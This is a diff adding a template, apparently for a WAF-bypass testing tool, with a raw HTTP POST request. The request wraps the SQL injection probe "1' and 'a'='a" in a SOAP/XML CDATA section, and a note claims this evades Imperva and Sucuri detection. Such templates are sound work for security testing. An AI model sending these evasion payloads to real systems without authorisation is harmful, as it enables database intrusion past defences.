@@ -1,0 +1,16 @@
+# @name: SOAP/XML Body 传参
+# @tags: post,xml,soap,sqli,imperva,sucuri,id,bypass
+# @color: ice
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: get_param_to_xml
+# @intent.param: id
+# @intent.payload: <id>1' and 'a'='a</id>
+# @intent.content_type: text/xml
+# @note: 用 SOAP/XML Body 包装参数，部分 WAF(Imperva、Sucuri)对 XML/CDATA 解析不全，CDATA 区段内关键字可逃逸检测。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: text/xml
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><id><![CDATA[1' and 'a'='a]]></id></soap:Body></soap:Envelope>
